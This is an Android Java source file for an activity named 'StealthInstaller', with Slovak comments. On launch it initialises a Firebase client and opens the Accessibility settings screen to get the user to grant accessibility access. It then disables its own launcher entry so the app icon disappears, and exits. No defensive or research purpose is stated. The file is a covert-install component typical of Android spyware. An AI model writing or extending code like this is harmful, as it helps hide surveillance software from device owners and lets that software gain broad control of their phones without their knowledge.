package com.example.app;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.provider.Settings;

public class StealthInstaller extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        FirebaseClient.init();

        // Otvorí nastavenia Accessibility (vyžaduje user interaction)
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);

        // Skrytie samotnej aktivity z launcheru
        PackageManager pm = getPackageManager();
        ComponentName component = new ComponentName(this, StealthInstaller.class);
        pm.setComponentEnabledSetting(component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);

        finish();
    }
}